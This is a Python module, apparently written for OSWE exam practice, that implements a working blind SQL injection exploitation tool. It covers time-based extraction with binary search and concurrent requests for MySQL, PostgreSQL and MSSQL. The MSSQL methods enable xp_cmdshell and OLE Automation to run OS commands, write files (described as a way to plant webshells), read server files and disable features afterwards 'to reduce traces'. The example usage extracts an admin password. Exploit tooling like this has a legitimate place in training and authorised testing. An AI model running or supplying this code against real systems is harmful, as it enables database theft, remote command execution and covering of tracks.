#!/usr/bin/env python3
"""
Blind SQL Injection Module for OSWE PoC Development

Provides optimized blind SQLi extraction with:
- Binary search for character extraction (faster than linear)
- Async/concurrent requests for speed
- Multiple database support (MySQL, PostgreSQL, MSSQL)
- Time-based and boolean-based detection
- Length extraction
- Automatic charset detection

Usage:
    from modules.sqli import BlindSQLi, MySQLDialect

    sqli = BlindSQLi(
        url="http://target/vuln.php?id=1",
        dialect=MySQLDialect(),
        delay=3
    )

    # Extract data
    data = sqli.extract("SELECT password FROM users WHERE id=1")
    print(f"Password: {data}")
"""

import requests
import time
import asyncio
import aiohttp
from typing import Optional, Callable, List
from abc import ABC, abstractmethod
from dataclasses import dataclass


# ============================================================================
# SQL DIALECTS
# ============================================================================

class SQLDialect(ABC):
    """Base class for SQL dialect support."""

    @abstractmethod
    def sleep_function(self, seconds: int) -> str:
        """Return SQL function for time delay."""
        pass

    @abstractmethod
    def substring_function(self, expression: str, position: int, length: int = 1) -> str:
        """Return SQL function for substring extraction."""
        pass

    @abstractmethod
    def length_function(self, expression: str) -> str:
        """Return SQL function for string length."""
        pass

    @abstractmethod
    def ascii_function(self, expression: str) -> str:
        """Return SQL function for ASCII code."""
        pass


class MySQLDialect(SQLDialect):
    """MySQL/MariaDB dialect."""

    def sleep_function(self, seconds: int) -> str:
        return f"SLEEP({seconds})"

    def substring_function(self, expression: str, position: int, length: int = 1) -> str:
        return f"SUBSTRING(({expression}),{position},{length})"

    def length_function(self, expression: str) -> str:
        return f"LENGTH(({expression}))"

    def ascii_function(self, expression: str) -> str:
        return f"ASCII({expression})"


class PostgreSQLDialect(SQLDialect):
    """PostgreSQL dialect."""

    def sleep_function(self, seconds: int) -> str:
        return f"pg_sleep({seconds})"

    def substring_function(self, expression: str, position: int, length: int = 1) -> str:
        return f"SUBSTRING(({expression}) FROM {position} FOR {length})"

    def length_function(self, expression: str) -> str:
        return f"LENGTH(({expression}))"

    def ascii_function(self, expression: str) -> str:
        return f"ASCII({expression})"


class MSSQLDialect(SQLDialect):
    """Microsoft SQL Server dialect with RCE capabilities."""

    def sleep_function(self, seconds: int) -> str:
        return f"WAITFOR DELAY '00:00:0{seconds}'"

    def substring_function(self, expression: str, position: int, length: int = 1) -> str:
        return f"SUBSTRING(({expression}),{position},{length})"

    def length_function(self, expression: str) -> str:
        return f"LEN(({expression}))"

    def ascii_function(self, expression: str) -> str:
        return f"ASCII({expression})"

    # ========================================================================
    # MSSQL-SPECIFIC RCE METHODS
    # ========================================================================

    def enable_xp_cmdshell(self) -> List[str]:
        """
        Return SQL commands to enable xp_cmdshell.

        xp_cmdshell is disabled by default in modern MSSQL versions.
        Requires sysadmin privileges to enable.

        Returns:
            List of SQL commands to execute sequentially
        """
        return [
            "EXEC sp_configure 'show advanced options', 1",
            "RECONFIGURE",
            "EXEC sp_configure 'xp_cmdshell', 1",
            "RECONFIGURE"
        ]

    def disable_xp_cmdshell(self) -> List[str]:
        """
        Return SQL commands to disable xp_cmdshell.

        Good practice to disable after exploitation to reduce traces.

        Returns:
            List of SQL commands to execute sequentially
        """
        return [
            "EXEC sp_configure 'xp_cmdshell', 0",
            "RECONFIGURE",
            "EXEC sp_configure 'show advanced options', 0",
            "RECONFIGURE"
        ]

    def execute_command(self, cmd: str) -> str:
        """
        Execute OS command via xp_cmdshell.

        Args:
            cmd: OS command to execute

        Returns:
            SQL query to execute command
        """
        return f"EXEC xp_cmdshell '{cmd}'"

    def check_xp_cmdshell_enabled(self) -> str:
        """
        Return SQL query to check if xp_cmdshell is enabled.

        Returns:
            SQL query that returns 1 if enabled, 0 if disabled
        """
        return "SELECT CONVERT(INT, ISNULL((SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'), 0))"

    def enable_ole_automation(self) -> List[str]:
        """
        Return SQL commands to enable OLE Automation Procedures.

        Alternative to xp_cmdshell for command execution.

        Returns:
            List of SQL commands to execute sequentially
        """
        return [
            "EXEC sp_configure 'show advanced options', 1",
            "RECONFIGURE",
            "EXEC sp_configure 'Ole Automation Procedures', 1",
            "RECONFIGURE"
        ]

    def execute_command_ole(self, cmd: str) -> str:
        """
        Execute OS command using OLE Automation.

        Alternative method when xp_cmdshell is blocked.

        Args:
            cmd: OS command to execute

        Returns:
            SQL query using OLE automation
        """
        return f"""DECLARE @output INT
DECLARE @result INT
EXEC @result = sp_OACreate 'WScript.Shell', @output OUT
EXEC @result = sp_OAMethod @output, 'Run', Null, '{cmd}', 0, True
EXEC @result = sp_OADestroy @output"""

    def write_file(self, filepath: str, content: str) -> str:
        """
        Write content to file using MSSQL bulk operations.

        Useful for writing webshells to web root.

        Args:
            filepath: Full path where file should be written
            content: Content to write to file

        Returns:
            SQL query to write file
        """
        # Escape single quotes in content
        escaped_content = content.replace("'", "''")
        return f"""EXEC sp_OACreate 'ADODB.Stream', @var OUT
EXEC sp_OASetProperty @var, 'Type', 2
EXEC sp_OASetProperty @var, 'Charset', 'utf-8'
EXEC sp_OAMethod @var, 'Open'
EXEC sp_OAMethod @var, 'WriteText', NULL, '{escaped_content}'
EXEC sp_OAMethod @var, 'SaveToFile', NULL, '{filepath}', 2
EXEC sp_OAMethod @var, 'Close'
EXEC sp_OADestroy @var"""

    def read_file(self, filepath: str) -> str:
        """
        Read file content using MSSQL OPENROWSET with BULK.

        Requires BULK INSERT permissions.

        Args:
            filepath: Full path to file to read

        Returns:
            SQL query to read file
        """
        return f"SELECT BulkColumn FROM OPENROWSET(BULK '{filepath}', SINGLE_BLOB) AS Contents"

    def list_databases(self) -> str:
        """Return SQL query to list all databases."""
        return "SELECT name FROM sys.databases"

    def list_tables(self, database: str = None) -> str:
        """
        Return SQL query to list tables.

        Args:
            database: Database name (None for current database)

        Returns:
            SQL query to list tables
        """
        if database:
            return f"SELECT table_name FROM {database}.information_schema.tables WHERE table_type='BASE TABLE'"
        else:
            return "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'"

    def list_columns(self, table: str, database: str = None) -> str:
        """
        Return SQL query to list columns in a table.

        Args:
            table: Table name
            database: Database name (None for current database)

        Returns:
            SQL query to list columns
        """
        if database:
            return f"SELECT column_name FROM {database}.information_schema.columns WHERE table_name='{table}'"
        else:
            return f"SELECT column_name FROM information_schema.columns WHERE table_name='{table}'"

    def get_version(self) -> str:
        """Return SQL query to get MSSQL version."""
        return "SELECT @@VERSION"

    def get_current_user(self) -> str:
        """Return SQL query to get current database user."""
        return "SELECT USER_NAME()"

    def get_current_database(self) -> str:
        """Return SQL query to get current database name."""
        return "SELECT DB_NAME()"

    def is_sysadmin(self) -> str:
        """Return SQL query to check if current user is sysadmin."""
        return "SELECT IS_SRVROLEMEMBER('sysadmin')"

    def stacked_query_separator(self) -> str:
        """Return separator for stacked queries in MSSQL."""
        return "; "


# ============================================================================
# BLIND SQLI EXTRACTOR
# ============================================================================

@dataclass
class SQLiConfig:
    """Configuration for blind SQLi."""
    url: str
    method: str = "GET"
    data: Optional[dict] = None
    headers: Optional[dict] = None
    cookies: Optional[dict] = None
    proxies: Optional[dict] = None
    timeout: int = 30
    verify_ssl: bool = False


class BlindSQLi:
    """
    Blind SQL Injection data extractor.

    Supports:
    - Time-based detection
    - Boolean-based detection
    - Binary search for characters (much faster than linear)
    - Async/concurrent requests
    """

    def __init__(self,
                 url: str,
                 dialect: SQLDialect = None,
                 delay: int = 3,
                 method: str = "GET",
                 data: Optional[dict] = None,
                 headers: Optional[dict] = None,
                 cookies: Optional[dict] = None,
                 proxies: Optional[dict] = None,
                 param_name: str = "id",
                 injection_point: str = "1{payload}",
                 logger=None):
        """
        Initialize blind SQLi extractor.

        Args:
            url: Target URL
            dialect: SQL dialect (MySQL, PostgreSQL, MSSQL)
            delay: Time delay in seconds for time-based SQLi
            method: HTTP method (GET, POST)
            data: POST data
            headers: HTTP headers
            cookies: HTTP cookies
            proxies: Proxy configuration
            param_name: Parameter name for injection
            injection_point: Injection template (use {payload} placeholder)
            logger: Optional logger instance
        """
        self.url = url
        self.dialect = dialect or MySQLDialect()
        self.delay = delay
        self.method = method.upper()
        self.data = data or {}
        self.headers = headers or {}
        self.cookies = cookies or {}
        self.proxies = proxies
        self.param_name = param_name
        self.injection_point = injection_point
        self.logger = logger
        self.session = requests.Session()

    def _inject(self, payload: str) -> requests.Response:
        """
        Execute SQL injection with given payload.

        Args:
            payload: SQL payload

        Returns:
            HTTP response
        """
        # Build injection
        injection = self.injection_point.replace("{payload}", payload)

        # Prepare request
        if self.method == "GET":
            params = {self.param_name: injection}
            response = self.session.get(
                self.url,
                params=params,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                timeout=self.delay + 10,
                verify=False
            )
        else:  # POST
            post_data = self.data.copy()
            post_data[self.param_name] = injection
            response = self.session.post(
                self.url,
                data=post_data,
                headers=self.headers,
                cookies=self.cookies,
                proxies=self.proxies,
                timeout=self.delay + 10,
                verify=False
            )

        return response

    def _time_based_test(self, condition: str) -> bool:
        """
        Test condition using time-based SQLi.

        Args:
            condition: SQL condition to test

        Returns:
            True if condition is true (delay occurred)
        """
        # Build payload: IF(condition, SLEEP(delay), 0)
        sleep_func = self.dialect.sleep_function(self.delay)
        payload = f"' AND IF(({condition}),{sleep_func},0)--"

        start_time = time.time()

        try:
            response = self._inject(payload)
            elapsed = time.time() - start_time

            # If response took longer than delay, condition is true
            return elapsed >= self.delay

        except requests.exceptions.Timeout:
            return True  # Timeout also indicates delay
        except Exception as e:
            if self.logger:
                self.logger.debug(f"SQLi test error: {e}")
            return False

    def extract_length(self, query: str) -> int:
        """
        Extract length of query result using binary search.

        Args:
            query: SQL query

        Returns:
            Length of result
        """
        if self.logger:
            self.logger.info(f"Extracting length of: {query[:50]}...")

        length_expr = self.dialect.length_function(query)

        # Binary search for length
        min_len, max_len = 0, 1000

        while min_len <= max_len:
            mid = (min_len + max_len) // 2

            condition = f"{length_expr}>{mid}"

            if self._time_based_test(condition):
                # Length is greater than mid
                min_len = mid + 1
            else:
                # Length is <= mid
                max_len = mid - 1

        length = min_len

        if self.logger:
            self.logger.success(f"Length: {length}")

        return length

    def extract_char_binary(self, query: str, position: int) -> str:
        """
        Extract character at position using binary search.

        Args:
            query: SQL query
            position: Character position (1-indexed)

        Returns:
            Extracted character
        """
        # Get ASCII code using binary search
        substring = self.dialect.substring_function(query, position, 1)
        ascii_expr = self.dialect.ascii_function(substring)

        # Binary search for ASCII code
        min_ascii, max_ascii = 32, 126  # Printable ASCII range

        while min_ascii <= max_ascii:
            mid = (min_ascii + max_ascii) // 2

            condition = f"{ascii_expr}>{mid}"

            if self._time_based_test(condition):
                # ASCII is greater than mid
                min_ascii = mid + 1
            else:
                # ASCII is <= mid
                max_ascii = mid - 1

        ascii_code = min_ascii
        char = chr(ascii_code) if 32 <= ascii_code <= 126 else '?'

        if self.logger:
            self.logger.debug(f"Position {position}: '{char}' (ASCII {ascii_code})")

        return char

    def extract_char_linear(self, query: str, position: int, charset: str = None) -> str:
        """
        Extract character at position using linear search.

        Args:
            query: SQL query
            position: Character position (1-indexed)
            charset: Character set to try (default: alphanumeric)

        Returns:
            Extracted character
        """
        if charset is None:
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

        substring = self.dialect.substring_function(query, position, 1)

        for char in charset:
            condition = f"{substring}='{char}'"

            if self._time_based_test(condition):
                if self.logger:
                    self.logger.debug(f"Position {position}: '{char}'")
                return char

        if self.logger:
            self.logger.warning(f"Position {position}: character not found in charset")
        return '?'

    def extract(self, query: str, use_binary: bool = True, max_length: int = None) -> str:
        """
        Extract full result of SQL query.

        Args:
            query: SQL query
            use_binary: Use binary search (faster) vs linear search
            max_length: Maximum length to extract (auto-detect if None)

        Returns:
            Extracted data
        """
        if self.logger:
            self.logger.info(f"Extracting data from: {query}")

        # Get length
        if max_length is None:
            length = self.extract_length(query)
        else:
            length = max_length

        if length == 0:
            if self.logger:
                self.logger.warning("Query returned empty result")
            return ""

        # Extract each character
        result = ""

        for position in range(1, length + 1):
            if use_binary:
                char = self.extract_char_binary(query, position)
            else:
                char = self.extract_char_linear(query, position)

            result += char

            if self.logger:
                self.logger.info(f"Progress: {result}")

        if self.logger:
            self.logger.success(f"Final result: {result}")

        return result

    async def extract_char_async(self, query: str, position: int, session: aiohttp.ClientSession) -> tuple:
        """
        Extract character asynchronously (for concurrent extraction).

        Args:
            query: SQL query
            position: Character position
            session: aiohttp session

        Returns:
            Tuple of (position, character)
        """
        # Get ASCII code using binary search
        substring = self.dialect.substring_function(query, position, 1)
        ascii_expr = self.dialect.ascii_function(substring)

        min_ascii, max_ascii = 32, 126

        while min_ascii <= max_ascii:
            mid = (min_ascii + max_ascii) // 2

            # Build payload
            sleep_func = self.dialect.sleep_function(self.delay)
            condition = f"{ascii_expr}>{mid}"
            payload = f"' AND IF(({condition}),{sleep_func},0)--"
            injection = self.injection_point.replace("{payload}", payload)

            # Make async request
            start_time = time.time()

            try:
                if self.method == "GET":
                    params = {self.param_name: injection}
                    async with session.get(self.url, params=params, timeout=self.delay + 10) as response:
                        await response.text()
                else:
                    post_data = self.data.copy()
                    post_data[self.param_name] = injection
                    async with session.post(self.url, data=post_data, timeout=self.delay + 10) as response:
                        await response.text()

                elapsed = time.time() - start_time

                if elapsed >= self.delay:
                    min_ascii = mid + 1
                else:
                    max_ascii = mid - 1

            except:
                max_ascii = mid - 1

        char = chr(min_ascii) if 32 <= min_ascii <= 126 else '?'
        return (position, char)

    async def extract_async(self, query: str, length: int = None) -> str:
        """
        Extract data using async/concurrent requests (much faster).

        Args:
            query: SQL query
            length: Length of result (auto-detect if None)

        Returns:
            Extracted data
        """
        if self.logger:
            self.logger.info(f"Async extraction from: {query}")

        # Get length
        if length is None:
            length = self.extract_length(query)

        if length == 0:
            return ""

        # Extract all characters concurrently
        async with aiohttp.ClientSession() as session:
            tasks = [
                self.extract_char_async(query, pos, session)
                for pos in range(1, length + 1)
            ]

            results = await asyncio.gather(*tasks)

        # Sort by position and build result
        results.sort(key=lambda x: x[0])
        result = ''.join([char for _, char in results])

        if self.logger:
            self.logger.success(f"Async result: {result}")

        return result


# Example usage
if __name__ == "__main__":
    from modules.logger import create_logger

    log = create_logger("sqli_demo")

    # Configure SQLi
    sqli = BlindSQLi(
        url="http://target.com/vuln.php",
        dialect=MySQLDialect(),
        delay=2,
        param_name="id",
        injection_point="1{payload}",
        logger=log
    )

    # Example 1: Extract database name
    print("\n[*] Example 1: Extract database name")
    db_name = sqli.extract("SELECT DATABASE()", use_binary=True)
    print(f"[+] Database: {db_name}")

    # Example 2: Extract password (async for speed)
    print("\n[*] Example 2: Extract password (async)")
    password_query = "SELECT password FROM users WHERE username='admin'"

    # First get length
    length = sqli.extract_length(password_query)
    print(f"[+] Password length: {length}")

    # Then extract async
    password = asyncio.run(sqli.extract_async(password_query, length=length))
    print(f"[+] Password: {password}")

    log.close()
